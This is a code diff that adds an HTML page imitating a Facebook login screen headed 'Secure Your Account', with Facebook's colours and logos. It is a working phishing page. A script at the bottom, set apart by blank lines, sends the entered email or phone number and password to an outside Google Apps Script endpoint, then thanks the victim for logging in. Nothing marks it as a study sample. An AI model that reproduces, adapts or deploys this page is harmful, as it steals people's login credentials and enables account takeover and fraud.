@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: #1c1e21;
+            margin: 0;
+        }
+
+        .fb-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .create-account {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .footer-logo {
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            display: block;
+        }
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>
+                <img src="https://i.ibb.co/xKLDgxM2/1024px-Facebook-f-logo-2021-svg.png" class="fb-logo">
+                Secure Your Account
+            </h1>
+        </div>
+
+        <form method="post" name="google-sheet">
+            <div class="input-group">
+                <input type="text"  placeholder="Mobile number or email address" required name="mobile_or_email">
+            </div>
+            <div class="input-group">
+                <input type="password"  placeholder="Password" required name="password">
+            </div>
+            <button type="submit" name="submit" class="login-btn">Log In</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="https://www.facebook.com/recover/initiate/">Forgot Password?</a>
+        </div>
+
+        <button class="create-account" onclick="window.location.href='https://www.facebook.com/r.php'">
+            Create a New Account
+        </button>
+
+        <img src="https://iili.io/3uJvne4.md.png" class="footer-logo">
+    </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzKFGw_Vsr5ya4zEN-cZ42jzjOFXjvbDdr3R5jC4BgRbAX-w_GxIxFzammUurMiTZaE/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for log in"))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+    
+    
+    
+    
+    
+</body>
+</html>
